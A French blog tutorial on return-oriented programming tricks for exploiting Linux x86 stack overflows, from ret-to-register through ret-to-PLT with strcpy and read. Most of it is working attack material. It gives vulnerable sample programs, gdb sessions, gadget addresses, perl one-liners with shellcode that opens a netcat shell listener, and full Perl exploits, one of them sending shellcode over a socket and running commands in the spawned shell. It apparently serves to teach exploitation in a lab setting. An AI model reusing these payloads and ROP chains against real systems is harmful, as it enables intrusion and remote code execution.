Title: Roping tricks
Date: 2013-08-26
Tags: overflow,rop
Author: Tosh
Summary: Brieve list of commons roping tricks

Voici un nouvel article où il sera question de ROP, et où je détaillerais quelques techniques particulières pouvant être utiles lors d'une exploitation de type stack overflow, format string et compagnie.

Pour comprendre tout ce qu'il sera dit, il est conseillé d'avoir des bonnes bases dans l'exploitation de binaires sous Linux, de savoir lire l'assembleur x86 et de comprendre comment le ROP fonctionne.

Pour chaque technique utilisée, je préciserais dans quels cas celle-ci est utile.

Ready to poWn ?! Gooo !

##0x00 Ret to register

Utilité : Cette technique peut être utile dans le cas où l'ASLR est en place, mais où N^X n'est pas activé.

Principe : Si l'adresse de notre payload est contenue dans un registre au moment du détournement du flux d\u2019exécution, il suffit de retourner sur un gadget du style call REG/jmp *REG pour que notre payload soit exécuté.

Voici l'exemple que je vais utiliser pour illustrer la technique :

	:::c
	#include <string.h>
	#include <stdio.h>

	char* foo(const char *b) {
	    char buff[256];

    	return strcpy(buff, b);
	}

	int main(int argc, char **argv) {

	    printf("%p\n", foo(argv[1]));

	    return 0;
	}

Testons avec GDB, pour voir ce qu'il se passe :

	:::console
	gdb$ r `perl -e 'print "ABCD" . "A"x268;'`
	Starting program: /home/tosh/Downloads/a.out `perl -e 'print "ABCD" . "A"x268;'`
	warning: Could not load shared library symbols for linux-gate.so.1.
	Do you need "set solib-search-path" or "set sysroot"?

	Program received signal SIGSEGV, Segmentation fault.
	--------------------------------------------------------------------------[regs]
	  EAX: 0xBFFFF8F0  EBX: 0xB7FB9000  ECX: 0xBFFFFD30  EDX: 0xBFFFF9FA  o d I t s z a p c 
	  ESI: 0x00000000  EDI: 0x00000000  EBP: 0x41414141  ESP: 0xBFFFFA00  EIP: 0x41414141
	  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007BError while running hook_stop:
	Cannot access memory at address 0x41414141
	0x41414141 in ?? ()
	gdb$ x/s $eax
	0xbffff8f0:     "ABCD", 'A' ...
	gdb$

On voit qu'au moment du plantage, eax contient l'adresse de notre buffer. Si on trouve un gadget permettant de jumper sur eax, on pourra détourner le flux d'exécution avec un shellcode de notre cru.

	:::console
	$ ropc -f ./a.out -g -F | grep "call\|jmp" | grep eax
	0x08048396  -> call eax ; leave ; ret ;

Voilà le gadget qu'il nous faut ! On a plus qu'à mettre un shellcode (ici un netcat) au début du buffer et de jumper dessus.

Notre payload ressemblera à :

	:::console
	[ SHELLCODE | PADDING | call eax (saved EIP) ]

	:::console
	$ ./a.out `perl -e 'print "\x31\xd2\x52\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x68\x2d\x6c\x76\x70\x89\xe0\x52\x68\x34\x34\x34\x32\x89\xe1\x52\x68\x2d\x76\x76\x65\x89\xe5\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe7\x52\x57\x55\x51\x50\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80" . "A"x197 . "\x96\x83\x04\x08";'`
	Listening on any address 4442 (saris)

 
##0x01 Ret to Ret

Utilité : Cette technique peut être utile dans le cas où l'ASLR et/ou PIE est en place, mais où N^X n'est pas activé.
Principe : il s'agit de dépiler les valeurs situées sur la pile, jusqu'à ce qu'on ai une adresse pouvant être utile pour poursuivre l'exploitation (fonction, gadget, payload...).

Voici l'exemple utilisé pour cette technique :

    :::c
	#include <string.h>

	void foo(const char *b, size_t s) {
	    char buff[256];

	    memcpy(buff, b, s);
	}

	int main(int argc, char **argv) {

	    foo(argv[1], atoi(argv[2]));

	    return 0;
	}

Jouons la vulnérabilité et examinons la stack au moment du plantage :

	:::console
	gdb$ r `perl -e 'print "ABCD"."A"x268;'` 400
	Starting program: /home/tosh/Downloads/a.out `perl -e 'print "ABCD"."A"x268;'` 400
	warning: Could not load shared library symbols for linux-gate.so.1.
	Do you need "set solib-search-path" or "set sysroot"?

	Program received signal SIGSEGV, Segmentation fault.
	--------------------------------------------------------------------------[regs]
	  EAX: 0xBFFFF8F0  EBX: 0xB7FB9000  ECX: 0x00000000  EDX: 0x00000000  o d I t s z a p c 
	  ESI: 0x00000000  EDI: 0x00000000  EBP: 0x41414141  ESP: 0xBFFFFA00  EIP: 0x41414141
	  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007BError while running hook_stop:
	Cannot access memory at address 0x41414141
	0x41414141 in ?? ()
	gdb$ x/50xw $esp
	0xbffffa00:     0x30303400      0x47445800      0x4e54565f      0x00313d52
	0xbffffa10:     0x5f485353      0x4e454741      0x49505f54      0x31333d44
	0xbffffa20:     0x44580037      0x45535f47      0x4f495353      0x44495f4e
	0xbffffa30:     0x4400313d      0x544b5345      0x535f504f      0x54524154
	0xbffffa40:     0x495f5055      0x77613d44      0x6d6f7365      0x74612f65
	0xbffffa50:     0x2f6d7265      0x2d333433      0x61722d30      0x3030646e
	0xbffffa60:     0x49545f6d      0x3933454d      0x00393137      0x4c454853
	0xbffffa70:     0x622f3d4c      0x622f6e69      0x00687361      0x4d524554
	0xbffffa80:     0x00000003      0x08048330      0x00000000      0x08048351
	0xbffffa90:     0x08048457      0x00000003      0xbffffab4      0x08048490
	0xbffffaa0:     0x08048500      0xb7fed040      0xbffffaac      0x0000001c
	0xbffffab0:     0x00000003      0xbffffc07      0xbffffc22      0xbffffd33
	0xbffffac0:     0x00000000      0xbffffd37
	gdb$ x/s 0xbffffc22
	0xbffffc22:     "ABCD", 'A' ...
	gdb$

On voit qu'à l'adresse esp+0xb8, on a l'adresse de notre buffer sur la stack. En dépilant 47 valeurs, on pourra alors jumper sur notre payload.
Pour dépiler une valeur, rien de plus simple, il faut sauter sur une instruction ret. En chaînant ces instructions, on va pouvoir dépiler les valeurs situées en haut de la pile.

Récupérons l'adresse d'une instruction ret :

	:::console
	$ ropc -f ./a.out -g -F -d 1
	0x080482be  -> ret ;

Nous avons plus qu'à exploiter la vulnérabilité, notre payload ressemblera à :

	:::console
	[ SHELLCODE | PADDING | RET (saved EIP) | 46xRET ]

Testons :

	:::console
	./a.out `perl -e 'print "\x31\xd2\x52\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x68\x2d\x6c\x76\x70\x89\xe0\x52\x68\x34\x34\x34\x32\x89\xe1\x52\x68\x2d\x76\x76\x65\x89\xe5\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe7\x52\x57\x55\x51\x50\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80" . "A"x197 . "\xbe\x82\x04\x08"x47 . " " . (47*4+268);'`
	Listening on any address 4442 (saris)

On voit que ça fonctionne à merveille !

## 0x02 Ret to PLT (strcpy, memcpy, sprintf...)

Utilité : Cette technique est utilisée pour copier un payload (shellcode, fake stack frame) dans une zone non soumise à l'ASLR par exemple. Elle peut également permettre de bypass des filtres de caractères. (On peut par exemple avoir un \x00 dans notre payload)
Principe : Il s'agit de chaîner les appels d'une fonction de recopie (strcpy...), en copiant certains octets du programmes non soumis à l'ASLR (segment DATA/CODE), vers une zone non randomisé.

Pour cet exemple, je vais utiliser ce programme vulnérable :

	:::c
	#include <string.h>
	#include <stdio.h>

	char buffer[256];

	void foo(const char *b) {
    	char buff[256];

        strcpy(buff, b);
	}

	int main(int argc, char **argv) {

	    if(atoi(argv[2]) == 0xcd)
	        foo(argv[1]);

	    return 0;
	}

Notre objectif va être de copier un shellcode grâce à la fonction strcpy, vers une zone non soumise à l'ASLR et writable.

Cherchons l'adresse de strcpy@PLT :

	:::console
	$ objdump -d ./a.out | grep "<strcpy@plt>:"
	080482f0 <strcpy@plt>:

On peut donc appeler strcpy en jumpant à l'adresse 0x080482f0.

Cherchons maintenant une zone mémoire +W, non soumise à l'ASLR :

	:::console
	$ readelf -S ./a.out | grep .bss
	  [25] .bss              NOBITS          08049740 000740 000120 00  WA  0   0 32

Parfait, on a une zone de 0x120 bytes writable à l'adresse 0x08049740.

Utilisons RopC pour rechercher notre shellcode dans le binaire :

	:::console
	$  ropc -f ./a.out -s "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
	0x08048330  -> "\x31"
	0x08048398  -> "\xc9"
	0x080484e6  -> "\xf7"
	0x08048334  -> "\xe1"
	0x0804832c  -> "\xb0"
	0x080481fc  -> "\x0b"
	0x08048114  -> "\x51"
	0x080482f6  -> "\x68"
	0x08048134  -> "\x2f"
	0x08048134  -> "\x2f"
	0x08048142  -> "\x73"
	0x080482f6  -> "\x68"
	0x080482f6  -> "\x68"
	0x08048134  -> "\x2f"
	0x08048137  -> "\x62"
	0x0804813d  -> "\x69\x6e"
	0x08048333  -> "\x89"
	0x080481aa  -> "\xe3"
	0x0804846a  -> "\xcd"
	0x0804803d  -> "\x80"
	20 strings found.

Parfait ! Tous les opcodes de notre shellcode sont présents en mémoire dans le binaire !

Maintenant, pour chaîner les appels à strcpy afin de copier notre shellcode opcodes par opcodes, nous avons besoin d'un gadget pour "dépiler" les arguments de l'appel précédent. Puisque strcpy a 2 arguments, il nous faut un gadget du type "pop; pop; ret" afin de pouvoir continuer l'exécution.

	:::console
	$ ropc -f ./a.out -g -F | grep pop
	0x080484ee  -> pop edi ; pop ebp ; ret ; 

Un appel à strcpy ressemblera à ça :

	:::console
	[ strcpy@PLT ]
	[ pop2; ret ]
	[Adresse .bss + offset]
	[Adresse opcode]

Nous avons tout ce qu'il nous faut pour réaliser notre exploit. Notre payload ressemblera à :

	:::console
	[ PADDING | strcpy@plt (saved-eip) | pop2; ret | Adresse .bss | Adresse opcode \x31 | strcpy@plt | pop2; ret | Adresse .bss + 1 | Adresse opcode \xc9 | ....... | Adresse .bss ]

L'exploit (en Perl) :

	:::perl
	#!/usr/bin/perl

	use strict;
	use warnings;

	my $payload = "A"x268;  # PADDING
	my $bss = 0x08049740;
	my $strcpy_plt = 0x080482f0;
	my $pop2_ret = 0x080484ee;

	# \x31
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss);
	$payload .= pack('L', 0x08048330);

	# \xc9
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss+1);
	$payload .= pack('L', 0x08048398);

	# \xf7
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss+2);
	$payload .= pack('L', 0x080484e6);

	# \xe1
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss+3);
	$payload .= pack('L', 0x08048334);

	# \xb0
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss+4);
	$payload .= pack('L', 0x0804832c);

	# \x0b
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss+5);
	$payload .= pack('L', 0x080481fc);

	# \x51
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss+6);
	$payload .= pack('L', 0x08048114);

	# \x68
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss+7);
	$payload .= pack('L', 0x080482f6);

	# \x2f
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss+8);
	$payload .= pack('L', 0x08048134);

	# \x2f
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss+9);
	$payload .= pack('L', 0x08048134);

	# \x73
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss+10);
	$payload .= pack('L', 0x08048142);

	# \x68
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss+11);
	$payload .= pack('L', 0x080482f6);

	# \x68
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss+12);
	$payload .= pack('L', 0x080482f6);

	# \x2f
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss+13);
	$payload .= pack('L', 0x08048134);

	# \x62
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss+14);
	$payload .= pack('L', 0x08048137);

	# \x69\x6e
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss+15);
	$payload .= pack('L', 0x0804813d);

	# \x89
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss+17);
	$payload .= pack('L', 0x08048333);

	# \xe3
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss+18);
	$payload .= pack('L', 0x080481aa);

	# \xcd
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss+19);
	$payload .= pack('L', 0x0804846a);

	# \x80
	$payload .= pack('L', $strcpy_plt);
	$payload .= pack('L', $pop2_ret);
	$payload .= pack('L', $bss+20);
	$payload .= pack('L', 0x0804803d);

	# Jump on your shellcode !
	$payload .= pack('L', $bss); 

	print $payload;

Testons :
	:::console
	$ ./a.out "`perl sploit.pl`" 205                                                                                                       
	bash-4.2$

## 0x03 Ret to PLT (read/recv...)

Utilité : Cette technique est très utile lorsqu'on est limité par la taille de notre payload. Elle peut également être utilisée pour copier ce que l'on souhaites en mémoire, en étant plus gêné par l'ASLR. Cette technique simplifie beaucoup de choses !
Principe : Il s'agit de retourner sur une fonction tel que read/recv, en réutilisant le descripteur de fichier du programme, afin de pouvoir envoyer des données (payload) vers la zone mémoire de notre choix.

Voici le programme utilisé pour illustrer la technique. Celui-ci tourne avec : nc -lp 4444 -e ./a.out :

	:::c
	#include <unistd.h>

	char buffer[256];

	void foo(int size) {
	char buff[256];

    	read(STDIN_FILENO, buff, size);
	}

	int main(int argc, char **argv) {

	    int size;

	    read(STDIN_FILENO, &size, sizeof(int));
	    foo(size);

	    return 0;
	}

L'objectif est d'écraser EIP avec l'adresse de read@plt. On aura alors plus qu'à envoyer notre shellcode pour jumper dessus.

Récupérons l'adresse d'une zone +W :

	:::console
	$ readelf -S ./a.out | grep ".bss"
	  [25] .bss              NOBITS          08049720 00070c 000120 00  WA  0   0 32

Récupérons l'adresse de read@plt :

	:::console
	$ objdump -d ./a.out | grep "<read@plt>:"
	080482d0 <read@plt>:

On a également besoin d'un gadget pour dépiler les arguments de read :

	:::console
	$ ropc -f ./a.out -g -F | grep pop
	0x080484bd  -> pop esi ; pop edi ; pop ebp ; ret ;

On a tout ce qu'il faut pour réaliser notre exploit !
Notre payload ressemblera à :

	:::console
	[292 | PADDING | recv@plt (saved-eip) | pop3; ret | STDIN | Adresse .bss | shellcode len | Adresse .bss ]

Voici l'exploit commenté (en Perl of course) :

	:::perl
	#!/usr/bin/perl

	use strict;
	use warnings;
	use IO::Socket::INET;

	my $sock = IO::Socket::INET->new(PeerAddr => 'localhost',
									 PeerPort => 4444,
									 Proto    => 'tcp');

	die("Can't connect : $!\n") if(!$sock);

	my $buff;

	my $shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

	my $payload;
	my $bss = 0x08049720;
	my $read_plt = 0x080482d0;
	my $pop3_ret = 0x080484bd;

	# Buffer len
	$payload .= pack('L', 292);

	# Padding
	$payload .= "A"x268; 

	# Read@plt function
	$payload .= pack('L', $read_plt);
	$payload .= pack('L', $pop3_ret);
	$payload .= pack('L', 0);
	$payload .= pack('L', $bss);
	$payload .= pack('L', length $shellcode);

	$payload .= pack('L', $bss);

	# Send payload
	print $sock $payload;

	sleep(1);

	# The payload is executed, now you can send your shellcode !
	print $sock $shellcode;

	sleep(1);

	# The shell is now spawned : you can send commands !
	print $sock "id\nexit\n";

	while(($buff = <$sock>)) {
		print $buff;
	}

Lançons-le :

	:::console
	$ perl sploit.pl
	uid=1000(tosh) gid=100(users) groups=100(users)

Bingo !

Le ret to PLT clos la première partie de cet article.

Il est à noter que toutes ces techniques peuvent bien sûr être combinées suivant les besoin et suivant les cas.
N'oubliez pas que chaque exploitation de vulnérabilité est unique en son genre, le plus important est d'être inventif !

Une deuxième partie de cet article devrait voir le jour, avec des nouvelles techniques de ROP pour être encore plus efficace dans l'exploitation de failles applicatives !

J'espère que ça vous à plût, n'hésitez pas à envoyer votre feedback !

Happy Hacking !

-Tosh-
